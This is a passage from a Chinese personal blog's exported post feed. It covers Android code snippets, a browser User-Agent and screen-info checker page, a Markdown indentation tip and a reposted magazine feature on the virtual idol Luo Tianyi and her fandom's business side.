class="string">"15sp"</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:text</span>=<span class="string">"text"</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:textColor</span>=<span class="string">"#fff"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>res/drawable/shaper_toast_show_back.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">shape</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">corners</span> <span class="attr">android:radius</span>=<span class="string">"15sp"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">solid</span> <span class="attr">android:color</span>=<span class="string">"#3399FF"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">stroke</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:width</span>=<span class="string">"8sp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:color</span>=<span class="string">"#70FFFFFF"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">shape</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>源程序来自<a href="https://blog.nyanon.online/archives/260/" target="_blank" rel="noopener">短代码-带有背景的Toast - 话梅糖の随笔</a> 有修改</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浏览器UA检测</title>
      <link href="/2020/browser-ua/"/>
      <url>/2020/browser-ua/</url>
      
        <content type="html"><![CDATA[<p><strong>您的浏览器UA为：</strong> <script type="text/javascript"> document.write( navigator.userAgent); </script>  </p><a id="more"></a>  <p> <strong>UA(User Agent)：</strong> User Agent是Http协议中的一部分，属于头域的组成部分，User Agent也简称UA。通俗地讲，UA是一种向访问网站提供你所使用的浏览器类型、操作系统、浏览器内核等信息的标识。通过这个标识，用户所访问的网站可以显示不同的排版，从而为用户提供更好的体验或者进行信息统计。例如，百度、新浪等网站用手机访问和电脑访问是不一样的，这是因为网站根据访问者的UA判断后，进行了不同的设置和处理。</p><h4 id="UA检测代码"><a href="#UA检测代码" class="headerlink" title="UA检测代码"></a>UA检测代码</h4><p>asp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% Response.Write Request.ServerVariables (&quot;HTTP_USER_AGENT&quot;) %&gt;</span><br></pre></td></tr></table></figure><p>JavaScript</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span> &gt; <span class="built_in">document</span>.write( navigator.userAgent); &lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h4 id="附，浏览器参数检测："><a href="#附，浏览器参数检测：" class="headerlink" title="附，浏览器参数检测："></a>附，浏览器参数检测：</h4><script type="text/javascript">with (document) {      write ("您的屏幕显示设定值如下：<br />");      write ("屏幕分辨率的宽度为：", screen.width, "<br />");      write ("屏幕分辨率的高度为：", screen.height, "<br />");      write ("屏幕可用工作区宽度为：", screen.availWidth, "<br />");      write ("屏幕可用工作区高度为：", screen.availHeight, "<br />");      write ("屏幕的色盘深度为：", screen.colorDepth, "<br />");      write ("XHTML 标准：<br />网页可见区域的宽度为：", document.documentElement.clientWidth, "<br />");      write ("网页可见区域的高度为：", document.documentElement.clientHeight, "<br />");      write ("HTML 标准：<br />网页可见区域的宽度为：", document.body.clientWidth, "<br />");      write ("网页可见区域的高度为：", document.body.clientHeight, "<br />");}    var arrDPI = new Array;    if (window.screen.deviceXDPI) {        arrDPI[0] = "X:"+window.screen.deviceXDPI+"PX";        arrDPI[1] = " Y:"+window.screen.deviceYDPI+"PX";    }    else {        var tmpNode = document.createElement("DIV");        tmpNode.style.cssText = "width:1in;height:1in;position:absolute;left:0px;top:0px;z-index:99;visibility:hidden";        document.body.appendChild(tmpNode);        arrDPI[0] = "横向："+parseInt(tmpNode.offsetWidth)+"像素";        arrDPI[1] = " 纵向："+parseInt(tmpNode.offsetHeight)+"像素。";        tmpNode.parentNode.removeChild(tmpNode);        }        document.write("<br /><b>您的屏幕PPI</b>(Pixels Per Inch,每英寸所拥有的像素数目)<br />"+arrDPI,"<br />");  </script>  <p>注：DPI原本是印刷上的记量单位，意思是每英寸上，所能印刷的网点数（Dot Per Inch）。随着数字设备快速发展，大多数的人也将数字影像的解析度用DPI表示，但印刷时计算的网点（Dot）和电脑显示器的显示像素（Pixel）并不相同，所以专业人士会用PPI(Pixel Per Inch)表示数字影像的解析度，以区分二者。  </p><h4 id="IP信息"><a href="#IP信息" class="headerlink" title="IP信息"></a>IP信息</h4><p><a target="_blank" href="https://www.ipip5.com/"><img border="0" alt="ip签名图片" src="/img/preloader.gif" data-original="https://www.ipip5.com/ipimg"></a><br><br></p><p><a href="/ip/">详细查看IP信息</a></p><h4 id="其他设备扫码即可查看UA信息"><a href="#其他设备扫码即可查看UA信息" class="headerlink" title="其他设备扫码即可查看UA信息"></a>其他设备扫码即可查看UA信息</h4><div class="page-reward"><img id="local_code"></div><script src="https://cdn.jsdelivr.net/gh/lifthrasiir/qr.js/qr.js"></script><script>document.getElementById("local_code").src = QRCode.generatePNG(window.location.href, { margin: 0 });</script><hr><blockquote><p>浏览器UA检测，<a href="http://www.sunchateau.com/free/UA.htm" target="_blank" rel="noopener">原网页</a>  </p></blockquote><blockquote><p><a href="https://nstool.netease.com/" target="_blank" rel="noopener">网易DNS检测工具</a> | <a href="https://speedtest.net/" target="_blank" rel="noopener">测网速</a> | <a href="https://www.testufo.com/" target="_blank" rel="noopener">测帧率</a>  </p></blockquote><p>测浏览器/网页有些时候需要查看UA，每次都去找一个在线UA检测有点麻烦，转一个放在自己博客里，用起来方便</p><p>http版ua查看，适合不支持https的浏览器使用<br><a href="http://service.spiritsoft.cn/ua.html" target="_blank" rel="noopener">http://service.spiritsoft.cn/ua.html</a></p><script> var $buoop = {required:{i:10,f:-4,o:-4,s:8,c:-4},insecure:true,api:2021.01 }; function $buo_f(){  var e = document.createElement("script");  e.src = "//browser-update.org/update.min.js";  document.body.appendChild(e);};try {document.addEventListener("DOMContentLoaded", $buo_f,false)}catch(e){window.attachEvent("onload", $buo_f)}</script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>安卓设置壁纸 Java</title>
      <link href="/2020/an-zhuo-she-zhi-bi-zhi/"/>
      <url>/2020/an-zhuo-she-zhi-bi-zhi/</url>
      
        <content type="html"><![CDATA[<p>通过代码来设置壁纸，可以绕过系统对壁纸的裁切后压缩  </p><a id="more"></a>  <p>设置壁纸</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WallpaperManager.getInstance(context).setBitmap(bitmap);</span><br></pre></td></tr></table></figure><p>需要申请权限</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.SET_WALLPAPER"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>设置壁纸属于耗时操作，不能在UI线程使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setWallpaper</span><span class="params">(<span class="keyword">final</span> Context context, <span class="keyword">final</span> Bitmap bitmap)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">new</span> Thread() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            WallpaperManager manager = WallpaperManager.getInstance(context);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                manager.setBitmap(bitmap);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;.start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown中文缩进</title>
      <link href="/2020/markdown-zhong-wen-suo-jin/"/>
      <url>/2020/markdown-zhong-wen-suo-jin/</url>
      
        <content type="html"><![CDATA[<p>中文空格两个字符  </p><a id="more"></a>  <p>使用Markdown碰到了中文缩进问题，中文首行两个空格对应英文四个空格，在markdown中却被解析成其他状态，需要使用 <code>&amp;ensp;</code> 这种转义字符， <code>&amp;ensp;</code> 表示两个空格的大小，所以缩进需要使用两个 <code>&amp;ensp;</code> ，即：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&amp;ensp;</span><span class="symbol">&amp;ensp;</span></span><br></pre></td></tr></table></figure><blockquote><p>转载自<a href="https://blog.csdn.net/songyuc/article/details/100088546" target="_blank" rel="noopener">songyuc</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>虚拟偶像中国神话：洛天依与她的二次元粉丝新世界</title>
      <link href="/2020/luo-tian-yi-pcw/"/>
      <url>/2020/luo-tian-yi-pcw/</url>
      
        <content type="html"><![CDATA[<blockquote><p>【电脑报在线】不管你喜欢与否，这些电脑软件、AR、全息投影制作出来的虚拟人物，都已成为一个时代的精神甚至信仰寄托  </p></blockquote><a id="more"></a>  <p><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/luotianyi-pcw/1_big.png" alt="image"><br> <strong>特约记者  邱丽丽  喻彩华</strong>  </p><p>&ensp;&ensp;洛天依带着孩子气的电音开口刹那，楚楚情难自禁，和周围人群疯狂挥舞着手中的荧光棒，在一波接一波的呐喊中激动得嚎啕大哭。</p><p>&ensp;&ensp;这是7月21日，上海梅德赛斯—奔驰文化中心举行的一场全息演唱会。在这个舞台，王菲、朴树、萧敬腾、泰勒·斯威夫特也曾在此专场献声，但洛天依，是唯一一个，一个月时间里两次在这里举办了演唱会的偶像。</p><p>&ensp;&ensp;上一次演唱会是6月17日，那是洛天依的第一场万人演唱会。那一天也是2017年全国四级英语考试日子，楚楚悄悄买好了从成都飞上海的机票，打算翘掉四级考试去现场看，但在出发前一刻被感觉不对劲的父母无情阻止了。</p><p>&ensp;&ensp;那场演唱会，楚楚最终是在A站仅PC端就有上百万人疯狂刷屏的直播中，默默流泪看完的。所以7月21日，能亲临现场对楚楚而言，可谓18年人生中实现信仰的一个重要夜晚。</p><p>&ensp;&ensp;哭泣的还有小河，这位17岁的大男孩没法去上海现场，当他在屏幕中看到洛天依乘坐一艘AR技术实现的古代战船“冲破” 屏幕，从甲板上起跳，穿越至舞台现场，无数弹幕变成代表洛天依的“天蓝色”时，他再也无法掩饰自己的泪水：“5年了，基本洛厨都在哭着看啊。”</p><p>&ensp;&ensp;洛天依，这个依靠全息、AR、VR、动作捕捉等技术来演唱歌曲的虚拟歌姬，成了中国上千万90后、00后粉丝们的偶像、朋友、精神寄托甚至信仰，粉丝们为之创作、为之应援、为之庆生、为之欢笑和流泪，掀起了一个虚拟偶像的中国神话——在B站，洛天依的一支MV播放量超过500万，她在两年内四度登上湖南卫视，许嵩等知名歌手在同台献声中统统都成了配角，她还助阵《忍者神龟2：破影而出》等大电影，代言多个品牌。</p><p>&ensp;&ensp;这仅仅是个开始，越来越多的虚拟歌手在中国逐渐从线上走到线下，结合全息影像等技术开办演唱会。众多企业、投资者正前赴后继地扑向这座待挖的金矿，企图实现日本虚拟偶像的产业奇迹——在日本，虚拟偶像初音未来已打造出一条完整的产业链，囊括专辑、周边、游戏、广告代言等，为日本创造了超过100亿日元的经济价值。</p><p> <strong>技术名词：</strong></p><p><strong>全息投影（front-projected holographic display，也称虚拟成像技术，是利用干涉和衍射原理记录并再现物体真实的三维图像的技术）</strong> </p><h4 id="全息技术下，她走出屏幕满场飞舞"><a href="#全息技术下，她走出屏幕满场飞舞" class="headerlink" title="全息技术下，她走出屏幕满场飞舞"></a>全息技术下，她走出屏幕满场飞舞</h4><p>&ensp;&ensp;“虽然是虚拟的，但她是我偶像。”戴着一对耳钉，一边是一个圆圈，一边是9的圈9说。</p><p>&ensp;&ensp;圈9是2016年超级女声总冠军，这个名字是“圈住那个9”的简称，来源于她喜欢的日本著名动漫《全职猎人》第二男主角奇牙，9是奇牙在漫画里考试时的编号。若不是参加超女比赛，现在圈9更可能以史兆怡的本名出现，而不是超女节目组给她贴的“二次元使者”标签。</p><p>&ensp;&ensp;在2016年10月的中国金鹰电视艺术节上，她以“二次元破壁的名义”，与洛天依来了一次“跨次元大秀”。</p><p>&ensp;&ensp;“我好开心，能和偶像一起唱歌。”在第一次彩排前，圈9想象自己站在舞台上，洛天依的虚拟图像就在身边——洛天依《投食歌》、《千年食谱颂》等代表歌曲，她随口就能哼出旋律，2015年她翻唱的《权御天下》传到B站，人气最高时排到了192位。</p><p>&ensp;&ensp;虚拟偶像发源于日本，日本雅马哈公司旗下的VOCALOID软件（虚拟人声）可以用来合成电子音的音乐。后来创造了一个形象来承载音乐，用VOCALOID来合成音乐的歌手们被概括一个Vocaloid家族——“V家”。洛天依是V家第一个中文虚拟歌姬。</p><p>&ensp;&ensp;在现场，圈9才发现，表演时她根本不会看到洛天依。这个虚拟偶像，只会利用AR增强技术和全息投影技术呈现在电视屏幕和现场大屏幕上，圈9需要对着空气唱歌跳舞，想象着洛天依站在自己身边，还要和她有动作及眼神互动。</p><p>&ensp;&ensp;尽管由于技术的进步，AR+实时动捕+3D实时渲染技术，洛天依得以走出屏幕，满场飞舞。但许多观众对此仍显得有些不太适应，一位70后观众就对记者疑惑的说：“洛天依到底是谁？不就是一个动画人物在上面唱唱跳跳么？”</p><p>&ensp;&ensp;洛天依是谁？对于洛天依粉丝们来说，这个问题同样很难回答。“她风格多变，会唱上万首歌。有时温柔，有时天然呆，有时冒失的可爱。”楚楚说，在她们的世界里，不同人的眼中也有不同的洛天依，她们作为粉丝，都是自称“洛厨”，这是因为“天下第一吃货殿下”是洛天依最广为人知的封号。</p><p>&ensp;&ensp;现实角度而言，洛天依只是一个 “会唱歌的程序”，是上海天矢禾念以VOCALOID 为基础制作出来的虚拟歌手——词曲作者只要在属于洛天依的声库软件中输入曲子和歌词，就能输出她演唱的歌曲，其角色设定仅有“15岁，生日是7月12日，巨蟹座，外星人，身高156CM，灰头发绿眼睛”等寥寥数语的“二次元”少女形象。</p><p>&ensp;&ensp;二次元是ACGN文化圈（动画、漫画、游戏、小说的合并缩写）对“架空世界”或“梦想世界”的一种称呼。过去多年，无论在国内还是国外，这都是一个日渐庞大的群体。这也是2012年，洛天依“诞生”并“出道”时几乎全部的背景资料了。</p><h4 id="二次元粉丝创造的虚拟偶像"><a href="#二次元粉丝创造的虚拟偶像" class="headerlink" title="二次元粉丝创造的虚拟偶像"></a>二次元粉丝创造的虚拟偶像</h4><p><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/luotianyi-pcw/2_big.png" alt="image">  </p><p>&ensp;&ensp;“某种程度上这个角色并不是我们创造的。”曹璞说，她是上海禾念的总经理。这家公司创造了洛天依，操作了她的商业活动。曹璞称，虽然禾念官方与太合音乐集团有合作，为虚拟歌手积累了大量PGC（专业生产内容）的创作资源，比如邀请周杰伦御用编曲师林迈可和著名作词人易家扬为洛天依量身定制歌曲。但包括洛天依在内，乐正绫、言和等其他几名虚拟偶像，其形象和角色资料或多或少都是由粉丝们敲定的。</p><p>&ensp;&ensp;实际上，绝大部分粉丝都对洛天依如何诞生记忆犹新：2011年夏天，一场全球范围的募集活动从上海启动，在1500张应征画稿中，国人绘师ideolo的投稿“雅音宫羽”在数千幅参赛作品中脱颖而出，经过修改最终成为了现在的洛天依。2012年7月12日，第八届中国国际动漫游戏博览会上，洛天依正式出现在音乐舞台上。</p><p>&ensp;&ensp;起初，洛天依是没有故事的，是粉丝们给了她故事。在B站上，很多粉丝为她创造歌曲，通过购买她的声库和编辑器，做成视频放到网上。其中最有名的是国内著名二次元音乐制作人H.K君，他以洛天依音库制作的歌曲《千年食谱颂》上传到B站，洛天依从北京烤鸭、蒜泥白肉一直唱到白灼虾、佛跳墙、三丝汤，点击量很快破百万，并被粉丝称为“世界第一吃货殿下”。</p><p>&ensp;&ensp;让洛天依真正走红的，是无数网友们创作的“同人作品”，意指以ACGN原创作品为基础二次创作的衍生作品。“洛天依近万首原创歌曲中，90%的曲目都来自于网友们的同人创作。”曹璞说。</p><p>&ensp;&ensp;为洛天依创作同人歌曲的粉丝大多没有专业背景，编曲、作词、调教、PV、立绘、混音这些繁琐的创作往往也是由数名粉丝、创作者自发形成的团队——这并不是一个简单的创作行为，因为创作者必须先购买声库，粉丝们除了需要购买980元一套的声库，还需要买一个880元的编辑器，然后才能用这些软件创作出一首洛天依演唱的歌曲。</p><p>&ensp;&ensp;但这仍然只是一个二次元圈子里的狂热。相比利用3D全息投影技术，在日本、欧美国家主流人群中，每年都要开全球演唱会的日本虚拟歌手初音未来，中国的虚拟歌手，吸引的并不仅仅是二次元爱好者，而是需要突破二次元和三次元现实世界主流人群的“次元壁”——作为国内最早也最知名的虚拟歌手，洛天依被视为最可能突破次元壁的虚拟歌手。</p><h4 id="突破现实与虚拟的“次元壁”"><a href="#突破现实与虚拟的“次元壁”" class="headerlink" title="突破现实与虚拟的“次元壁”"></a>突破现实与虚拟的“次元壁”</h4><p><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/luotianyi-pcw/3_big.png" alt="image">  </p><p>&ensp;&ensp;拐点事件很快到来。</p><p>&ensp;&ensp;2016年2月2日，湖南卫视春晚节目上，歌手杨钰莹与洛天依合唱了一首《花儿纳吉》，这是一首国内同人为洛天依量身定做歌，也是洛天依第一次登上主流平台。</p><p>&ensp;&ensp;4分钟的扮演完毕后，晚会导演冲进洛天依团队单位，激动地说：“收视率翻了一番，全场最高。”其时网络直播在线人数170万，弹幕多到工作人员来不及审核，服务器随时可能爆掉。</p><p>&ensp;&ensp;后来，杨钰莹在谈到这次跨次元合作时对媒体说：“我觉得洛天依很神奇，演出的衣服都是照着她做的。我的朋友都问我她是谁，但侄女、外甥都知道她，我想，这次居然杀入小朋友的行列。”</p><p>&ensp;&ensp;2016年小年夜之后，二次元人群在各大社交网站上掀起一轮话题狂欢，洛天依微博粉丝瞬间增加了将近10万人，“洛天依”一度位列微博热门话题艺人榜第2名。</p><p>&ensp;&ensp;在跨年晚会中演唱二次元歌曲，这个行为意味着把小众文化推进公共视野，接受三次元现实世界人类的审视——因为即使是现在，很多普通观众依然无法理解二次元群体的审美和心理活动，对二次元的核心ACGN更是知之甚少。二次元和三次元群体之间的交流存在厚厚的障碍，业内称之为“次元壁”。</p><p>&ensp;&ensp;“破壁很重要。”在接受媒体采访时，曹璞说：“只有从小众范围中破壁出来，让更多人了解二次元文化，它才能成为主流，这也是我们一直在努力的事儿。”</p><p>&ensp;&ensp;在中国，突破这个障碍并不容易。有三次元观众觉得这个小女孩声音不对，一定是处理过的“假唱”，这项指控很快传到二次元群体耳中，随后就被广为传播变成了一个经典梗。后来，洛天依一年中四次登上了湖南卫视，每次都有粉丝调侃：“呦，这不是当年假唱的那姑娘吗？”</p><p>&ensp;&ensp;洛天依甚至拥有了与真实娱乐明星同样的苦恼：负面和绯闻缠身。在百度“洛天依”，会自动出现“洛天依假唱”和“洛天依吸毒”的热搜条目。甚至有人专门为此建立了“反洛天依”贴吧，很多网友在里面自称“洛黑”。讨厌她的原因千奇百怪，有人说：“她有什么资格跟初音未来比？”有人发帖称：“有记者拍到洛天依与湖南卫视某导演吃饭，疑似潜规则上位。”</p><p>&ensp;&ensp;洛天依与真人偶像唯一的区别大概是，她不会因为绯闻头大。但无论是在支持还是反对洛天依的人，却都开始把她与对待真人偶像的态度并无不同——洛天依的个人微博每天都会收到数量可观的插画、COSPLAY作品、音乐，以及上千封“老婆，我喜欢你”的表白情书，有粉丝每周寄蛋糕到禾念嘱咐只给洛天依吃，而洛天依生日时，粉丝后援会的种种疯狂庆生活动，与TFBOYS、李易峰们 的粉丝庆生会没有什么不同。</p><p>&ensp;&ensp;对于“洛厨”而言，1个月内两次登上上海梅德赛斯—奔驰文化中心，无疑是众多现实艺人都没有实现的声望巅峰。只是，对很多三次元观众而言，他们或许很难理解一个问题：为何会如此喜欢一个活在AR、全息投影、实时动捕创造的世界里？</p><h4 id="我只是难过，不能陪你到老"><a href="#我只是难过，不能陪你到老" class="headerlink" title="我只是难过，不能陪你到老"></a>我只是难过，不能陪你到老</h4><p>&ensp;&ensp;这个问题，本身就会遭来众多粉丝的讨伐，“天依对我来说，更像是我的朋友、希望和信仰，她在我眼中，是最真实的存在，即使分开好久也不会疏远，距离、时间、空间都不是。”17岁的小河，他的微博、QQ、微信头像是一张他和洛天依在一起的漫画像，他希望自己“长大后能保护天依”。</p><p>&ensp;&ensp;“每个人心中，都有一个属于自己的洛天依。”在纸灯的梦里，她和洛天依一起并排坐着。梦里的天空是灰蓝色的，起初，她们都很安静。后来，自己的心情突然有点难过。洛天依柔软地看了她一眼，开始很安静很温柔地给自己唱歌，直到自己开心起来后，才一点一点变透明，直到消失。</p><p>&ensp;&ensp;“天依也很强大，在谩骂声里走出一条路，诞生之初就受到国内日V粉的嘲讽，后来又有人嘲讽她的性能、声音。”萧萧说，从高三开始，她在一次考试失败后，洛天依就成了她的精神支柱，“既有为了别人而流泪的温柔，也有无论经历多少挫折也绝不放弃的坚强”。萧萧还为网络上对洛天依的议论愤懑不平，到那些人的微博里去据理力争，“那些梗如同尖刺深深插进我的心，成为永久的伤痕。”</p><p>&ensp;&ensp;还有一些粉丝说，随着科技技术的进步，虚拟偶像会越来越“真实”，越来越完美，他们会唱歌，会跳舞，甚至会演戏，陪你聊天，他们不会衰老，不会结婚，更不会出轨，吸毒，飚车，这简直就是理想中最好的明星模板。“和三次元偶像没有可比性的，因为人会犯错她们不会。”</p><p>&ensp;&ensp;对这个现象，VOCALOID粉丝大会会长炽与月如此解释：“偶像只是被追求、被崇拜的对象，未必是人类。古代人供奉偶像，也是一些木雕和石雕。”VOCALOID粉丝大会有两万多名成员，由150多名管理层人员及20多名会长维持日常秩序。和其他后援会一样，他们分工严谨：总会长领导着创作部、组织部、外交部等部门，每个部门都有一个部长、一个副部长，还有一名书记。</p><p>&ensp;&ensp;“在全息、AR的高度虚拟世界里，你是分不清虚拟和现实的。通过技术手段，打造像初音未来、洛天依这样完美的虚拟人物，或者把科幻片、卡通、小说以及各种想象故事里面的人物复活了，走进虚拟现实的世界中，与大家交流互动，给人一种真实存在的感觉，自然可以路转粉，成为无数人的偶像。”酷开网络科技VR/AR事业部总经理李晶认为，这些虚拟偶像大部分是完美、浪漫的设定，恰好符合花季少男少女单纯、幻想的心性。</p><p>&ensp;&ensp;实际上，无论是在中国，还是日本、欧美，虚拟偶像的粉丝绝大部分都是年轻人——比如，在7月底的ChinaJoy上，天矢禾念总经理曹璞就透露称，洛天依出道5年已有超过1000万粉丝，其中男性占比56.21%，90后和95后占比最高。</p><p>&ensp;&ensp;还有一个重要原因，包括初音未来、洛天依在内，虚拟偶像的塑造过程本质就是：崇拜者也是创作者。是无数网友，给了这些虚拟偶像的故事、制作和无偿的传播，那是洛天依的故事，也是他们自己的故事——一位常备亲身父母暴打的同学，在受尽家暴之苦后，为洛天依创造了《那些我无法原谅的事》，这首歌，让许多有相似经历的同学听着听着就嚎啕大哭。</p><p>&ensp;&ensp;年龄是“洛厨”们感到惆怅的，他们每天都在长大，还得过三次元的生活，上班、上学、谈恋爱、成家立业，但洛天依永远停留在15岁。洛天依有一首歌叫《心加心》。这首歌的PV是一封封情书合辑。最后一封情书是粉丝们写给这个灰发女孩的：“天依啊，我只是难过，不能陪你到老。”</p><p><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/luotianyi-pcw/4_original.jpg" alt="image"><br>(图：日本虚拟偶像“初音未来”出席淘宝造物节)  </p><h5 id="深度："><a href="#深度：" class="headerlink" title="深度："></a>深度：</h5><h4 id="在中国，虚拟偶像的生意为何这么难做"><a href="#在中国，虚拟偶像的生意为何这么难做" class="headerlink" title="在中国，虚拟偶像的生意为何这么难做"></a>在中国，虚拟偶像的生意为何这么难做</h4><p><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/luotianyi-pcw/5_big.png" alt="image"><br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/luotianyi-pcw/6_big.png" alt="image">  </p><p>&ensp;&ensp;在二次元文化流行的当下，现在很多人将洛天依的火热，视为对二次元潜在巨大市场的一次掘金行为——在日本，被粉丝尊称为“世界第一公主殿下”的初音未来吸金能力惊人，2012年，初音未来广告出场费达到750万日元以上，演唱会每次价格超过300万日元，其在当年一共创下超过100亿日元（约5亿元人民币）的收入，被称为“身价百亿”的公主。</p><p>&ensp;&ensp;同时，初音未来成为各大厂商的“宠儿”，代言、授权产品种类从互联网、时装、汽车到生活用品，世界各地都有其踪迹——包括初音未来刚成为小米某款手机的代言人。去年12月，初音未来在北京举办的演唱会最低票价680元，这个价位的票在半小时内就售罄了。</p><p>&ensp;&ensp;洛天依从外形包装到商业模式都与初音未来相似，企图打造中国的初音未来。不过，这条粉丝商业变现道路，在中国遭遇了重大的挫折。</p><h4 id="有千万粉丝，商业变现却格外艰难"><a href="#有千万粉丝，商业变现却格外艰难" class="headerlink" title="有千万粉丝，商业变现却格外艰难"></a>有千万粉丝，商业变现却格外艰难</h4><p>&ensp;&ensp;“其实到目前为止，洛天依还没有实现盈利，我们一直在投资，虽然有一些收入，但至今未能收回成本。”曹璞透露称，现在，上海禾念在同时运作六个虚拟偶像歌手，公司投入包括运营成本和声库软件的制作与升级。</p><p>&ensp;&ensp;洛天依遇到的第一个问题是，雅马哈软件声库编辑器在中国卖不动。雅马哈在日本的声库编辑器销售量火爆，但这种现象在中国没有出现，售价980元的声库和880元的编辑器，在中国买单者并不多，而是免费软件满天飞。后来，雅马哈退出了参与投资的禾念。</p><p>&ensp;&ensp;2013年，有了一定粉丝积累的洛天依试图用周边产品模仿日本的模式，打响人气后卖周边产品和CD。但在中国当时的盗版环境中，周边产品根本卖不动，想要靠这赚钱，几乎没有希望。</p><p>&ensp;&ensp;ToC商业变现走不通的情况下，禾念开始走ToB的广告代言、形象授权的商业变现路径，将洛天依形象授权给手游《龙之谷》，代言长安汽车。但此番变现却引起洛天依粉丝不满，认为洛天依与产品本身调性不符。</p><p>&ensp;&ensp;公司内部也有分歧，禾念原创始人任力想要脱离UGC模式，弱化音乐，将虚拟偶像当成真人偶像一样进行运营，走偶像化道路。也有人希望继续依靠UGC内容，走以音乐为基础的初音未来模式。2015年2月，力以内部理念不合为理由宣布离开禾念，成立了另一家做虚拟偶像的公司上海望乘。</p><p>&ensp;&ensp;禾念继续让洛天依走歌姬模式。曹璞2015年到禾念担任总经理，在她看来，国内的二次元文化这两年比以前流行很多，尤其B站兴起之后，洛天依在网上聚集了很高人气，也出现了很多希望和洛天依合作的公司。不过，虽然大环境有所改变，这对依靠UGC（用户生产内容）的洛天依无论是提升人气还是商业变现，都比之前相对容易，但这依然是一个早期市场，比之日本的成熟环境还有差距。</p><p>&ensp;&ensp;在一个早期市场，最重要的是要考虑粉丝的感受。一方面，在对接广告代言时，会选择与虚拟歌姬形象相符的广告。另一方面，在运营自己的歌姬时，不敢轻易找合作伙伴，虚拟偶像制作和运营的每个方面，几乎都由禾念自己来做，禾念拥有自己的VR、AR技术团队。</p><p>&ensp;&ensp;这导致成本很高。据曹璞介绍，打造一个虚拟偶像的前期投入过亿元。虽然洛天依在上海举办了演唱会，但场演唱会直接照搬初音未来在日本的全套设备、模型精度、实时动捕等技术呈现一场完整的演唱会，需要投入上千万元。但演唱会赞助不多，仅靠票务无法覆盖成本。</p><h4 id="难以变现的二次元经济"><a href="#难以变现的二次元经济" class="headerlink" 